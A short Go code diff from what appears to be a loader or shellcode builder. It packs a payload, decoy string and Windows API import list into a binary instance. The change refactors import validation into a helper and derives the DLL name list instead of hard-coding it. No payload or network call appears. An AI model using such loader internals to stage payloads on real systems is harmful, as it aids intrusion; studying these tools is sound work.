@@ -118,13 +118,9 @@ func Build(config Config) (instance []byte, staged []byte, moduleName string, er
 	if imports == nil {
 		imports = DefaultAPIImports
 	}
-	if len(imports) == 0 || len(imports) > 64 || imports[0].Name != "LoadLibraryA" {
-		return nil, nil, "", fail(FailureInvalidConfiguration, "API import list must have 1..64 entries with LoadLibraryA first")
-	}
-	for _, imp := range imports {
-		if imp.Module == "" || imp.Name == "" {
-			return nil, nil, "", fail(FailureInvalidConfiguration, "API import contains an empty DLL or export name")
-		}
+	dllNames, err := DLLNamesForAPIImports(imports)
+	if err != nil {
+		return nil, nil, "", &Failure{Kind: FailureInvalidConfiguration, Err: err}
 	}
 
 	moduleData := config.Payload
@@ -238,7 +234,7 @@ func Build(config Config) (instance []byte, staged []byte, moduleName string, er
 		put32(instance, 1368, 1)
 	}
 	put64(instance, 3232, uint64(modLen))
-	copyCString(instance[576:832], "ole32;oleaut32;wininet;mscoree;shell32")
+	copyCString(instance[576:832], dllNames)
 	copyCString(instance[1392:1912], config.Decoy)
 	setPayloadStringsAndGUIDs(instance, config.ModuleType, config.Thread)
 	if staging {
